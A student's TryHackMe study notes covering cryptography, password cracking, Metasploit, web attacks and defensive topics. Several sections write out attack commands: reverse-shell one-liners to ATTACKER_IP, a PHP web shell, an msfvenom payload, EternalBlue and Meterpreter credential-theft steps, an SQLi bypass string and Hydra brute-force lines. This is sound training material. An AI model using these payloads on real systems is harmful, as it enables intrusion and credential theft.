CTF Relevance: Recognized RSA as a frequent CTF challenge requiring manipulation of variables (p, q, n, e, d, m, c)

3. Diffie-Hellman Key Exchange
Elegant Solution: Enables two parties to establish a shared secret over an insecure channel without prior secrets

Mathematical Execution: Understood the modular arithmetic behind public value exchange (g^a mod p, g^b mod p) and shared secret derivation

Real-world Integration: Recognized its combination with RSA for comprehensive security (DH for key agreement, RSA for authentication)

4. SSH (Secure Shell)
Dual Authentication: Comprehended the two-way verification process: client verifies server identity, then server authenticates client

Key-based Authentication: Mastered SSH key generation (ssh-keygen), algorithm selection (ed25519, RSA), and proper key management

Security Practices: Understood critical safeguards: never share private keys, use passphrases, set correct file permissions (600)

Penetration Testing Utility: Learned to use SSH keys for upgrading reverse shells to stable, fully-functional terminals

5. Digital Signatures and Certificates
Identity Assurance: Understood how digital signatures verify message authenticity and integrity

Non-repudiation: Recognized how signatures prevent senders from denying message authorship

Certificate Authority Role: Comprehended the trust hierarchy in PKI (Public Key Infrastructure)

6. PGP and GPG
Email Security: Learned to use GPG for encrypting emails and files, and creating digital signatures

Key Management: Mastered GPG key generation with modern algorithms (ECC/Curve25519), expiration settings, and backup procedures

Practical Operations: Understood the workflow of public key distribution for encryption and private key usage for decryption

CTF Applications: Recognized GPG decryption as common challenge, with gpg2john for passphrase recovery attempts

🛠️ Practical Conclusion
Public key cryptography is the foundation of modern secure communications. The key realization from this module is that each algorithm serves specific purposes: RSA for encryption and signatures, Diffie-Hellman for secure key establishment, and practical implementations like SSH and GPG for real-world security applications.

The mathematical concepts, while initially abstract, become manageable through systematic approaches to modular arithmetic and understanding the "why" behind each operation. The transition from theoretical cryptography to practical implementation in tools like SSH and GPG demonstrates how these concepts protect everyday digital interactions.

Key Skill Acquired: Ability to select and implement appropriate asymmetric cryptography solutions based on specific security requirements, whether for secure shell access, encrypted email, or establishing confidential communications channels.

## Module Completed: Hashing Basics
Completion Date: [2025/09/29]
Module Objective: Master the fundamental concepts of cryptographic hashing, including hash functions, password storage security, hash recognition, cracking techniques, and data integrity verification.

📚 What I Learned / Skills Acquired
This module provided a comprehensive understanding of hashing as a cornerstone of cybersecurity, covering both defensive applications for security and offensive techniques for penetration testing.

1. Hash Functions Fundamentals
Core Concept: Understanding hashing as a one-way process that creates fixed-size digital fingerprints from data of any size

Key Properties: Mastered the five essential characteristics of cryptographic hash functions: determinism, fixed output size, speed, irreversibility, and avalanche effect

Collision Theory: Learned about hash collisions and why they're mathematically inevitable but practically difficult to achieve with secure algorithms

Real-World Example: Demonstrated how a single bit change completely transforms the hash output across MD5, SHA1, and SHA256

2. Password Storage Security
Security Evolution: Understood the progression from plaintext storage to modern salted hashing techniques

Common Vulnerabilities: Analyzed real-world security failures including RockYou (plaintext), Adobe (weak encryption), and LinkedIn (unsalted SHA1)

Rainbow Table Defense: Comprehended how unique salts defeat precomputed attack tables by ensuring identical passwords produce different hashes

Modern Best Practices: Learned to implement secure password storage using algorithms like Argon2, Bcrypt, and PBKDF2 with proper salting

3. Hash Recognition and Identification
Linux/Unix Systems: Mastered identification through prefix analysis ($y$ for yescrypt, $6$ for SHA512, $1$ for MD5)

Windows Environments: Learned to distinguish NTLM hashes and understand their relationship to MD4

Contextual Analysis: Developed skills to identify hash types based on their source (web applications, system files, databases)

Tool Proficiency: Gained experience with automated recognition tools while understanding their limitations and the importance of manual verification

4. Password Cracking Techniques
Tool Ecosystem: Became proficient with Hashcat and John the Ripper for practical password recovery

Attack Strategies: Learned to apply dictionary attacks using wordlists like rockyou.txt against various hash types

Hardware Considerations: Understood the performance differences between CPU-based (John) and GPU-optimized (Hashcat) approaches

Practical Syntax: Mastered command structure for both tools, including hash type specification and attack mode selection

5. Data Integrity Verification
File Verification: Learned to use hashing to ensure file integrity for downloads and detect unauthorized modifications

Duplicate Detection: Understood how identical hashes identify duplicate files across systems

HMAC Implementation: Comprehended keyed-hash message authentication for ensuring both authenticity and integrity

Real-World Application: Practiced checksum verification for ISO files and understanding PGP-signed hash lists

🛠️ Practical Conclusion
Hashing serves as the foundation for multiple cybersecurity domains, from securing user authentication to ensuring data integrity. The key insight from this module is the dual nature of hashing knowledge: defensive practitioners must understand secure implementation to protect systems, while offensive specialists need recognition and cracking skills for penetration testing and recovery operations.

The progression from theoretical concepts to practical tools like Hashcat and John the Ripper demonstrates how abstract cryptographic principles translate into real-world security applications. Understanding both the strengths of modern hashing algorithms and the vulnerabilities of historical approaches provides crucial context for evaluating system security.

Key Skill Acquired: The ability to implement secure hashing practices for password protection, recognize and classify hash types in diverse environments, and apply appropriate tools and techniques for password recovery and integrity verification across multiple scenarios.

# Module Completed: John The Ripper - The Basics

**Completion Date:** [2025/09/29]
**Module Objective:** Gain practical, hands-on experience with John the Ripper to crack various types of password hashes and protected files, understanding its core modes and auxiliary tools.

## 📚 What I Learned / Skills Acquired

This module transformed John the Ripper from a theoretical tool into a practical Swiss Army knife for password recovery across multiple scenarios.

### 1. Basic Syntax & Hash Cracking
- **Fundamental Command Structure:** Mastered the basic syntax `john [options] [file path]` for initiating cracking sessions.
- **Automated Cracking:** Used `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` for automatic hash type detection and cracking.
- **Format-Specific Cracking:** Learned to specify hash formats for precision using `--format=raw-md5`, `--format=raw-sha1`, `--format=nt`, etc., after identifying hashes with tools like `hash-identifier`.

### 2. Single Crack Mode
- **Leveraging Usernames:** Utilized the `--single` flag for a fast first attack, which heuristically generates password guesses based on the provided username and GECOS information.
- **File Format Requirement:** Understood the critical requirement of formatting input files as `username:hash` for this mode to function.

### 3. Custom Rules for Complex Policies
- **Exploiting Predictability:** Created custom rules in the `john.conf` file to exploit predictable user behavior when meeting password complexity requirements (e.g., capitalizing the first letter and appending numbers/symbols).
- **Rule Syntax:** Gained foundational knowledge of rule syntax, including:
    - `Az` to append characters.
    - `A0` to prepend characters.
    - `c` to capitalize letters.
    - Character sets like `[0-9]` and `[A-Z]`.
- **Implementation:** Successfully called custom rules in attacks using the `--rule=RuleName` flag.

### 4. Cracking Hashes from /etc/shadow
- **The Unshadow Process:** Learned to combine the `/etc/passwd` and `/etc/shadow` files into a format John can understand using the `unshadow` tool: `unshadow local_passwd local_shadow > unshadowed.txt`.
- **Cracking System Passwords:** Fed the output directly into John to crack Linux user passwords, a common privilege escalation step.

### 5. Cracking Password-Protected Files & Keys
Mastered the use of auxiliary tools to extract hashes from protected resources for John to crack:
- **ZIP Files:** `zip2john secure.zip > zip_hash.txt`
- **RAR Files:** `rar2john secure.rar > rar_hash.txt`
- **SSH Private Keys:** `ssh2john id_rsa > ssh_hash.txt`

## 🛠️ Practical Conclusion

John the Ripper's power lies in its flexibility. This module provided a structured approach to tackling password cracking: start with fast attacks like Single Crack mode, move to large wordlists, and finally, employ targeted custom rules or formats. The key to efficiency is correctly identifying the hash type and using the appropriate `*2john` tool for files and keys.

The ability to methodically work through cracking Windows and Linux authentication hashes, protected archives, and SSH keys is a fundamental skill for penetration testing and red team operations.

**Key Skill Acquired:** A systematic methodology for password cracking across diverse scenarios, from basic hash files to real-world artifacts like stolen credential databases and encrypted sensitive files.

# TryHackMe - Cyber Security 101

## Module Completed: Metasploit: Introduction

**Completion Date:** [2025/09/30]
**Module Objective:** Introduce the fundamental concepts of the Metasploit penetration framework, its modular architecture, and the basic workflow within `msfconsole`.

### 📚 What I Learned / Key Concepts

This module lays the foundation for using one of the most powerful tools in a cybersecurity professional's toolkit.

#### 1. **Introduction to Metasploit**
- **What is it?** An **open-source framework** for developing and executing exploits against remote targets. It is the central tool for many phases of a penetration test.
- **Purpose:** To provide a unified platform for researching, developing, and executing code that exploits security vulnerabilities.

#### 2. **Main Components of Metasploit (Modular Architecture)**
Metasploit is organized into modules, allowing for great flexibility and code reuse.

| **Component** | **Main Function** |
| :--- | :--- |
| **Auxiliary** | Support modules such as scanners, fuzzers, and information gathering tools. They do not execute payloads. |
| **Encoders** | Transform payloads to evade antivirus software. |
| **Evasion** | Creates custom executables to evade protection measures on the client. |
| **Exploits** | Code that takes advantage of a specific vulnerability in software or a system. |
| **NOPs** | Generators of “No Operation” instructions for exploit stability. |
| **Payloads** | Code that executes on the target system after a successful exploit (e.g., `meterpreter`, reverse shells). |
| **Post** | Post-exploitation modules that run once access to a system has been gained. |

#### 3. **Msfconsole: The Heart of Metasploit**
- **Main Interface:** `msfconsole` is the most powerful and widely used interface within the framework.
- **Contexts:** It is crucial to understand what context you are in, as it defines the available commands:
- `msf6 >`: Main prompt.
- `msf6 exploit(...) >`: Context of a loaded module (where options are configured).
- `meterpreter >`: Active session on a compromised system.

#### 4. **Working with Modules (Basic Workflow)**
The lifecycle for using a module in `msfconsole` follows these steps:

1.  **Select a Module:**
```bash
    use exploit/windows/smb/ms17_010_eternalblue
    ```

2.  **Display and Configure Options:**
```bash
    show options          # View required and optional parameters.
    set RHOSTS 10.10.x.x  # Configure the target IP.
    set LHOST 10.10.y.y   # Configure the attacker IP (for reverse connections).
    ```

3.  **Global Configuration (Optional):**
    ```bash
    setg RHOSTS 10.10.x.x # `setg` sets a value for all modules.
    ```

4.  **Launch Execution:**
    ```bash
    exploit
    # or
    run
    ```

5.  **Manage Sessions:**
    ```bash
    sessions              # List active sessions.
    sessions -i <ID>      # Interact with a specific session.
    background            # Send a meterpreter session to the background.
    ```

### 🛠️ **Practical Conclusion**
Metasploit is no longer an intimidating “black box.” By understanding its modular structure and the basic flow of `msfconsole`, it becomes a systematic and predictable tool for:
- Checking for vulnerabilities.
- Automating the exploitation phase.
- Centrally managing access to multiple compromised systems.

> **Key Skill Acquired:** The ability to navigate the `msfconsole` interface, search for modules relevant to a target, and apply the fundamental flow of `use -> configure -> run` to execute them.

## Module Completed: Metasploit: Exploitation ##

**Completion Date:** [2025/09/30]

1. Module Objective
Demonstrate the complete Metasploit workflow, from passive reconnaissance to remote code execution (RCE).

Master project data management (hosts, services, workspaces) within the Metasploit console.

2. Key Project Phases (High-Level Commands)
Phase    Demonstrated Task    Essential Commands
I. Setup & Management    
Initialize the database and create the project workspace.

systemctl start postgresql, sudo -u postgres msfdb init, workspace -a [name] 

II. Reconnaissance    
Scan services and automatically save hosts to the database.

db_nmap -sV [target IP] / 

hosts / services 

III. Exploitation (Example: MS17-010)    
Use the exploit module and configure the 

Reverse Shell payload.

use exploit/windows/smb/ms17_010_eternalblue / 

set payload generic/shell_reverse_tcp / 

set LHOST [Your IP] / 

run 

IV. Post-Exploitation    
Management of multiple accesses (sessions) in the background.

sessions -l / sessions -i [ID]


Export to spreadsheets
3. Customization Tools (MSFVENOM)

Function: Creation of independent payloads for scenarios where a direct exploit is not used (e.g., in a file upload vulnerability on a website).

Key Command Example:

Bash

# Creating a Windows executable file that calls the attacking machine
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe

The Handler: The crucial step is to configure the listener to catch that connection: use exploit/multi/handler.

4. Conclusions and Defense
Mitigation: How was the vulnerability that was attacked defended? (E.g., “The MS17-010 vulnerability was mitigated by installing the Microsoft security patch and disabling SMBv1.”)


Lesson learned: (e.g., “The importance of not skipping the information gathering phase, as the success of the exploit depends on knowing the services running on the target.”)

## Module Completed: Metasploit: Meterpeter ##

**Completion Date:** [2025/09/30]

1. Module Objective: Post-Exploitation with Meterpreter
Demonstrate complete control over a remote host after a successful exploit.

Master critical commands for management, lateral movement, and credential theft.

2. Survival and Stealth Commands (Core Commands)
Key Task    Command/Technique    Notes and Value
Stability    migrate [PID]    
Migrated the session to a stable process (e.g., a system service) to avoid losing the connection if the initial process fails.

Identity    getuid    
View the privilege level (Ideally: 

NT AUTHORITY\\SYSTEM) to know what to attempt next.

Listing    ps    
Processes were listed to identify targets for migration and obtain system information.

Native Access    shell    
Obtain a normal command line from the victim to execute binaries not available in Meterpreter.


Export to Spreadsheets
3. Information and Credential Gathering (The Gold)

Password Hashes: The hashdump command was used to extract NTLM hashes from the Windows SAM database.

Next Step: These hashes are valuable for Pass-the-Hash attacks or for cracking the password.


Keystroke Capture: A keylogger was configured using keyscan_start and keyscan_dump to capture user activity.


Important Files: Use search -f [name] to locate specific files (such as flags in CTFs or configuration files).

4. Advanced Post-Exploitation (Bonus Track)

Additional Modules: Demonstrated how to use the load kiwi command to access more powerful tools for credential extraction, such as creds_all and dcsync.


Code Execution: Used the load python (or Ruby) command to execute scripts directly in memory.

## Module Completed: Moniker Link ##
**Completion Date: [2025/10/01]
Section    Content    Value for Employment
I. Concept of NTLM    Brief explanation: NTLM does not send the password, but rather a hash (a digital fingerprint) that can be decrypted or used in a Pass-the-Hash attack.    Demonstrates knowledge of Windows authentication.

II. The Role of Responder    Responder is a passive man-in-the-middle that listens for specific requests (such as NetBIOS/LLMNR). Explain: Responder impersonates a server so that the victim sends the hash to it.    Demonstrates knowledge of network and attack tools.

III. The Defense How to mitigate this attack: 1. Disable LLMNR/NetBIOS. 2. Enforce SMB signing. 3. Use Kerberos authentication instead of NTLM.    High Value: Demonstrates that you know how to secure, not just attack.

## Module Completed: Blue

**Completion Date:** [2025/10/01]

Title: Exploit MS17-010 (EternalBlue) and Credential Cracking: Analysis of a Critical Attack
I. Project Objective
This project documents the complete process of exploiting the MS17-010 (EternalBlue) flaw in a vulnerable Windows system, covering everything from reconnaissance and the initial attack to advanced post-exploitation (privilege escalation and credential theft).

II. Attack Phases (Workflow)
Phase    Tools Used    Key Commands
Reconnaissance    Nmap    The vulnerability to the SMB protocol was confirmed by a scan (nmap -sV) that showed port 445/TCP open on an unpatched Windows system.
Exploitation    Metasploit    The exploit/windows/smb/ms17_010_eternalblue module was used to obtain remote code execution (RCE).
Conversion    Post-Module    The initial unstable shell was converted to a more robust Meterpreter shell using the post/multi/manage/shell_to_meterpreter post-module.
Escalation and Persistence    Meterpreter    Getsystem was executed to reach the NT AUTHORITY\SYSTEM privilege level, and the migrate [PID] command was used to move the session to a stable process.
Credential Theft    Meterpreter    Hashdump was executed to extract the hashes of local user passwords.

Export to Spreadsheets
III. Cracking and Final Credentials
Non-default user found: [Username response]

Hash obtained: [Copied hash]

Cracked password: [Decrypted password response]

IV. Mitigation and Defense (The Value of the Blue Team)
The fundamental value of this exploit is understanding how to prevent it. The following defensive measures completely close this vulnerability:

Patching: Immediately install Microsoft's MS17-010 security patch.

Disable SMBv1: Configure systems to only use more secure versions of the SMB protocol (v2 and v3).

Network Segmentation: Restrict access to port 445/TCP from untrusted zones, ensuring that only authorized internal systems can communicate via SMB.

# Module Completed: Web Application Basics

**Completion Date:** [2025/10/01]

Title: Fundamentals of Web Applications: HTTP Architecture and Security Analysis
I. Project Objective
To document the fundamental components of web applications, with a focus on HTTP communication security, as a basis for understanding and mitigating injection and Cross-Site Scripting (XSS) attacks.

II. Web Application Architecture
A distinction is made between the interface (front-end), consisting of HTML (structure), CSS (style), and JavaScript (behavior), and the back-end, which includes the server and database (the main target of SQL injection).

III. Analysis of HTTP Communication
Security focuses on manipulating the flow of Requests and Responses:

Component    Security Risk (Focus)
GET/POST Methods    GET (get data): Should not carry sensitive information in the URL. POST (send data): Main target of malicious data injection.
Headers    Carry authentication tokens and cookies. They are manipulated by attackers for identity theft (e.g., changing the User-Agent).
Query String (?key=value)    The most common attack zone; modifying these values can lead to SQLi or XSS.

Export to Spreadsheets
IV. Key Defense: Security Headers (Blue Team)
The following headers are essential for mitigating the most common browser-level attacks:

Content-Security-Policy (CSP): Implements a whitelist for scripts and resources, mitigating XSS.

Strict-Transport-Security (HSTS): Forces the browser to use HTTPS to prevent protocol downgrade attacks.

Set-Cookie: Must include the HttpOnly (protects against theft by XSS) and Secure (only sent over HTTPS) flags.

## Module Completed: JavaScript Essentials

**Completion Date:** [2025/10/01]

Title: JavaScript Essentials: Risk Analysis and Injection Techniques for XSS
I. Project Objective
To analyze the role of JavaScript in web applications from a security perspective, identifying the risks posed by weak implementations and techniques used for malicious code injection (XSS).

II. Key Attack Mechanisms
The following points represent the most significant security flaws that allow attacks via JavaScript:

Direct Script Injection: The attacker uses the <script> tag (internal or external) in an input field to cause the browser to execute unwanted code.

Abuse of Dialog Functions: The attacker's use of functions such as alert() or prompt() is the standard method for testing the existence of an XSS and, in extreme cases, causing a Client Denial of Service.

Control Flow Bypass: Security validation (e.g., logins, age verification) should NEVER reside in client-side JavaScript, as the attacker can easily bypass if-else statements to gain unauthorized access.

III. Code Forensics (Information Gathering)
Minification and Obfuscation: These techniques only hide the code from plain sight, but do not make it more secure. The attacker uses online deobfuscation tools to reverse the process and search for API keys, tokens, or vulnerable business logic in the source code.

## Module Completed: SQL Fundamentals

**Completion Date:** [2025/10/01]

Title: SQL Fundamentals: Risk Analysis and Attack Surface for SQL Injection (SQLi)
I. Project Objective
To document the structure of relational databases (SQL) and the use of manipulation commands as a basis for understanding SQL injection (SQLi) attacks.

II. The Critical Attack Surface (Validation Failure)
The main security risk is concentrated in the manipulation of CRUD operations through user input:

WHERE Clause Attack: Every successful SQLi attack focuses on manipulating the WHERE clause (used in SELECT, UPDATE, DELETE) to force the condition to always be true (TRUE).

Authentication Bypass: The fundamental payload ' OR 1=1 -- is injected into a login field to bypass password validation.

III. Data Extraction Commands and Functions
Once a vulnerability is exploited, the attacker uses the following functions to steal information:

Command    Security Purpose    Use in SQLi (Attack Example)
SELECT    Read data from the database.    UNION SELECT is injected to combine and dump data from hidden tables (e.g., users).
CONCAT()    Combines multiple fields into a single string.    Used with UNION SELECT to steal combined credentials: CONCAT(username, ‘:’, password).
LENGTH() / SUBSTRING()    Functions that extract length and substrings.    Essential in Blind SQLi (Blind SQL Injection) attacks to guess table names and passwords one character at a time.
SHOW TABLES / DESCRIBE    DB mapping functions.    Used by the attacker to guess the internal structure of the database and the exact names of the columns to steal.

## Module Completed: Burp Suite: The Basics

**Completion Date:** [2025/10/02]

Title: Burp Suite: The Basics - Interception Flow and Attack Principles
I. Module Objective
Ensure control over web traffic using Burp Proxy to intercept, inspect, and modify HTTP/S requests. This is the foundational step for performing injection tests (SQLi, XSS, etc.).

II. Attack Flow: From Client to Server
The main value of Burp Suite is to convert the browser from a spectator to an active manipulator, demonstrating that client-side filters are useless for security.

Tool    Main Function    Role in the Attack
Proxy    Interception and Analysis.    Captures the request before it reaches the server. Allows manipulation of the payload in situ.
Repeater    Repetitive Testing.    Receives the request from the Proxy and sends it multiple times with modified payloads for fuzzing or manual exploitation.
Target    Reconnaissance (Map).    Maps the entire structure of the application (Site map) and identifies hidden endpoints that can be attacked.

Export to Spreadsheets
III. Mastered Security Concepts
Filter Bypass: Understanding that client-side (browser) filters can be easily evaded, making request manipulation in the proxy the only effective method of attack.

Scope: Clearly define the limits of the pentest to focus traffic only on the target, eliminating third-party “noise.”

HTTPS Fundamentals: Knowledge of the CA Certificate installation process to intercept and decrypt encrypted traffic (TLS/SSL).

# OWASP Top 10 - 2021 | TryHackMe Completion
## Completion Date: [2025/10/03]

## 📋 Module Overview
Completion of the OWASP Top 10 2021 module covering the most critical web application security risks.

## 🎯 Skills Acquired

### 1. Broken Access Control (IDOR)
- Identification and exploitation of Insecure Direct Object References
- Authorization bypass techniques
- Horizontal and vertical privilege escalation

### 2. Cryptographic Failures  
- Hash analysis and cracking methodologies
- Data encryption best practices
- Secure transmission protocols

### 3. Injection Attacks
- SQL injection exploitation
- Command injection techniques
- Input validation and sanitization

### 4. Insecure Design
- Architectural security flaws identification
- Threat modeling concepts
- Secure development lifecycle principles

### 5. Security Misconfiguration
- Service hardening techniques
- Default credentials exploitation
- Debug interface security

### 6. Vulnerable Components
- Vulnerability scanning with WPScan
- Exploit research and application
- Patch management strategies

### 7. Authentication Failures
- Brute force attack methodologies
- Session management security
- Multi-factor authentication implementation

### 8. Software Integrity Failures
- JWT token security analysis
- Data integrity verification
- Hash validation techniques

### 9. Security Logging & Monitoring
- Log analysis and correlation
- Threat detection strategies
- Incident response preparation

### 10. SSRF (Server-Side Request Forgery)
- Internal network enumeration
- Cloud metadata exploitation
- Request validation mechanisms

## 🛠️ Practical Experience
- Hands-on exploitation exercises
- Real-world vulnerability scenarios
- Defense implementation strategies

## 📚 Certification
Module completed as part of TryHackMe's Cyber Security 101 path

## Hydra - Brute Force Tool | TryHackMe Completion
## Completion Date: [2025/10/03]

## 🎯 Module Overview
Completion of the Hydra module covering online password brute-forcing techniques and tools.

## 🔧 Skills Acquired

### Command Line Proficiency
- **SSH Brute Forcing:**
  ```bash
  hydra -l username -P wordlist.txt target_ip ssh -t 4
Web Form Attacks:

bash
hydra -l admin -P passwords.txt target_ip http-post-form "/login:username=^USER^&password=^PASS^:F=invalid" -V
FTP Protocol Attacks

Parameter Optimization (-t threads, -V verbose, -f stop on first found)

Protocol Understanding
SSH, FTP, HTTP/HTTPS form-based authentication

RDP, Telnet, and various network service protocols

Web application login mechanisms (POST forms)

Attack Strategy
Wordlist selection and management

Thread optimization for performance

Response analysis for success detection

Rate limiting awareness and evasion techniques

🛡️ Defense Insights
Importance of strong password policies

Account lockout mechanisms

Multi-factor authentication implementation

Log monitoring for brute force detection

📚 Practical Applications
Penetration testing engagements

Security assessment of authentication systems

Educational understanding of brute force vulnerabilities

Part of TryHackMe's Cyber Security 101 Path

# Gobuster - Web Reconnaissance Tool | TryHackMe Completion
## Completion Date: [2025/10/03]
## 🎯 Module Overview
Completion of the Gobuster module covering web directory enumeration, subdomain discovery, and virtual host identification.

## 🔧 Skills Acquired

### Directory & File Enumeration (dir mode)
```bash
# Basic directory scanning
gobuster dir -u http://target.com -w wordlist.txt

# With file extensions
gobuster dir -u http://target.com -w wordlist.txt -x .php,.html,.js

# With authentication and cookies
gobuster dir -u http://target.com -w wordlist.txt -U user -P pass -c "session=abc123"
Subdomain Discovery (dns mode)
bash
# Subdomain enumeration
gobuster dns -d target.com -w subdomains.txt

# With IP resolution
gobuster dns -d target.com -w subdomains.txt -i
Virtual Host Identification (vhost mode)
bash
# Virtual host discovery
gobuster vhost -u http://target-ip -w wordlist.txt --domain target.com --append-domain --exclude-length 300
🎯 Key Competencies
Tool Mastery
Three Operational Modes: dir, dns, vhost

Parameter Optimization: Thread management, delays, extensions

Result Interpretation: HTTP status codes, response sizes, DNS records

Wordlist Management: Selection and customization for different scenarios

Technical Understanding
Difference between DNS subdomains and virtual hosts

HTTP protocol and header manipulation

Web server architecture and virtual hosting

Stealth scanning techniques to avoid detection

Practical Application
Comprehensive web asset discovery

Identification of hidden administrative interfaces

Development and testing environment detection

Backup file and sensitive directory location

🛡️ Professional Insights
Importance of thorough reconnaissance in penetration testing

How hidden assets become attack vectors

Defense strategies against enumeration attacks

Log monitoring for reconnaissance detection

Part of TryHackMe's Cyber Security 101 Path 

# Shells Overview - Remote Access Techniques | TryHackMe Completion
## Completion Date: [2025/10/03]
## 🎯 Module Overview
Completion of the Shells Overview module covering remote access techniques including reverse shells, bind shells, and web shells.

## 🔧 Skills Acquired

### Shell Types Mastered
- **Reverse Shells**: Initial connections from compromised systems to attacker machines
- **Bind Shells**: Listening services on target systems awaiting connections
- **Web Shells**: Web-based scripts for command execution on compromised servers

### Advanced Listener Tools
```bash
# RLwrap with history and editing
rlwrap nc -lvnp 443

# Ncat with SSL encryption
ncat --ssl -lvnp 443

# Socat for complex connections
socat -d -d TCP-LISTEN:443 STDOUT
Multi-Language Payloads
Bash:

bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
Python:

python
python -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
PHP:

php
<?php system($_GET['cmd']); ?>
Netcat:

bash
nc -e /bin/bash ATTACKER_IP 443
Web Shells Implementation
p0wny-shell: Minimalist PHP web shell

b374k shell: Advanced PHP web shell with file management

Custom web shell deployment techniques

Upload vulnerabilities exploitation

🎯 Key Competencies
Technical Understanding
Difference between reverse and bind shells

Firewall evasion techniques

Payload selection based on target environment

Connection persistence strategies

Detection avoidance methods

Practical Application
Establishing remote access in penetration tests

Maintaining access to compromised systems

Network pivoting from initial access points

Web application backdoor deployment

Post-exploitation activities

🛡️ Defense Insights
Monitoring for suspicious shell activity

Detecting web shell deployments

Network traffic analysis for reverse shells

Service monitoring for bind shells

File integrity monitoring for web shells

# SQLMap Basics - SQL Injection Automation | TryHackMe Completion
##Completion Date: [2025/10/03]

## 🎯 Module Overview
Completion of the SQLMap Basics module covering automated detection and exploitation of SQL injection vulnerabilities.

## 🔧 Skills Acquired

### SQLMap Command Mastery
```bash
# Basic detection
sqlmap -u "http://target.com/search?cat=1"

# Database enumeration
sqlmap -u "http://target.com/search?cat=1" --dbs

# Table enumeration
sqlmap -u "http://target.com/search?cat=1" -D database_name --tables

# Data extraction
sqlmap -u "http://target.com/search?cat=1" -D database_name -T table_name --dump

# POST request testing
sqlmap -r request_file.txt
Injection Types Identified
Boolean-based Blind SQLi

Time-based Blind SQLi

Error-based SQLi

UNION-based SQLi

Advanced Techniques
Parameter specification with -p

Batch mode for automated testing (--batch)

Interactive wizard mode (--wizard)

Request file processing for POST data

Comprehensive database structure mapping

🎯 Key Competencies
Tool Proficiency
Automated vulnerability detection

Progressive database enumeration

Mass data extraction capabilities

Support for various SQL database systems

Adaptive testing based on application responses

Technical Understanding
Difference between GET and POST parameter testing

Various SQL injection techniques and their detection

Database structure analysis and mapping

Data exfiltration methodologies

Defense evasion capabilities

Practical Application
Rapid assessment of web application security

Identification of critical data exposure risks

Comprehensive penetration testing workflows

Efficient vulnerability validation

Professional reporting preparation

🛡️ Defense Insights
Importance of input validation and sanitization

Implementing prepared statements

Web Application Firewall (WAF) configuration

Database permission hardening

Regular security assessment requirements

# SOC Fundamentals - Seguridad Defensiva | TryHackMe Completion
## Completion Date: [2025/10/04]
## 🎯 Module Overview
Completion of the SOC Fundamentals module covering security operations center principles, roles, processes, and technologies.

## 🔧 Knowledge Acquired

### SOC Three Pillars Framework
- **👥 People**: Hierarchical roles and responsibilities
- **🔄 Processes**: Alert triage, incident response, reporting
- **🛠️ Technology**: Security tools integration and automation

### SOC Roles Structure
**Tier 1 Analysts**: First responders, basic triage
**Tier 2 Analysts**: Deep investigation, correlation analysis  
**Tier 3 Analysts**: Threat hunting, critical incident response
**Security Engineers**: Tool implementation and configuration
**Detection Engineers**: Security rule creation and tuning
**SOC Manager**: Process management and executive communication

### Alert Triage Methodology
**5 W Framework**:
- **What**: Type of security event
- **When**: Timestamp of occurrence
- **Where**: Location/asset affected
- **Who**: User/system involved
- **Why**: Root cause analysis

### Key Security Technologies
- **SIEM (Security Information & Event Management)**: Centralized log analysis and correlation
- **EDR (Endpoint Detection & Response)**: Real-time endpoint monitoring and response
- **Firewalls**: Network traffic filtering and threat blocking
- **Additional Tools**: AV, EPP, IDS/IPS, SOAR, XDR

## 🎯 Practical Applications

### Operational Understanding
- End-to-end threat detection and response workflows
- Alert prioritization and escalation procedures
- Incident reporting and documentation standards
- Security tool integration strategies

### Professional Development
- Career path understanding in security operations
- Cross-functional team collaboration
- Metrics and KPIs for security monitoring
- Continuous improvement in security posture

## 🛡️ Defense Insights
- Importance of layered security controls
- Balance between automation and human analysis
- Proactive vs reactive security approaches
- Resource allocation in security operations

# Digital Forensic Fundamentals | TryHackMe Completion
## Completion Date: [2025/10/04]
## 🎯 Module Overview
Completion of the Digital Forensics Fundamentals module covering cyber crime investigation techniques, evidence handling, and forensic analysis methodologies.

## 🔧 Knowledge Acquired

### Forensic Methodology (NIST Framework)
- **Collection**: Evidence acquisition and preservation
- **Examination**: Data filtering and relevant evidence extraction  
- **Analysis**: Correlation and timeline reconstruction
- **Reporting**: Legal documentation and executive summaries

### Evidence Acquisition Protocols
- **Legal Authorization**: Proper warrants and permissions
- **Chain of Custody**: Documentation for evidence integrity
- **Write Blockers**: Hardware/software for evidence preservation
- **Forensic Imaging**: Bit-by-bit copies of storage media

### Windows Forensic Analysis
- **Disk Imaging**: Complete storage device copies using FTK Imager
- **Memory Imaging**: RAM capture for volatile data using DumpIt
- **Artifact Analysis**: File systems, registry, logs, user activity
- **Tool Proficiency**: FTK Imager, Autopsy, Volatility Framework

### Metadata Analysis
- **EXIF Data**: Image metadata extraction with ExifTool
- **PDF Metadata**: Document provenance with pdfinfo
- **GPS Coordinates**: Geolocation from digital photos
- **Timeline Analysis**: Creation/modification dates

## 🛠️ Tools Mastered

### Acquisition Tools
- **FTK Imager**: Disk imaging and preliminary analysis
- **DumpIt**: Memory capture from live systems
- **Write Blockers**: Evidence preservation devices

### Analysis Tools
- **Autopsy**: Comprehensive digital forensics platform
- **Volatility**: Advanced memory forensics framework
- **ExifTool**: Metadata extraction from multiple file formats
- **pdfinfo**: PDF metadata analysis

## 🎯 Practical Applications

### Investigative Techniques
- Incident response and post-breach analysis
- Criminal investigation support
- Corporate policy violation investigations
- Intellectual property theft cases

### Legal Compliance
- Evidence handling for court proceedings
- Chain of custody documentation
- Expert witness preparation
- Regulatory compliance investigations

## 🔍 Forensic Specializations
- **Computer Forensics**: Workstation and server analysis
- **Mobile Forensics**: Smartphone and tablet investigation
- **Network Forensics**: Traffic analysis and log correlation
- **Cloud Forensics**: Infrastructure-as-a-Service investigation
- **Database Forensics**: Data manipulation and access analysis

# Incident Response Fundamentals | TryHackMe Completion
## Completion Date: [2025/10/04]

## 🎯 Module Overview
Completion of the Incident Response Fundamentals module covering crisis management protocols, response frameworks, and practical incident handling techniques.

## 🔧 Knowledge Acquired

### Incident Response Frameworks
**SANS PICERL Framework:**
- **Preparation**: Team training, tool implementation, plan development
- **Identification**: Alert analysis and incident confirmation
- **Containment**: Impact minimization and threat isolation
- **Eradication**: Complete threat removal from environment
- **Recovery**: System restoration and normalization
- **Lessons Learned**: Post-incident analysis and improvement

**NIST Framework:**
- Preparation
- Detection & Analysis
- Containment, Eradication & Recovery
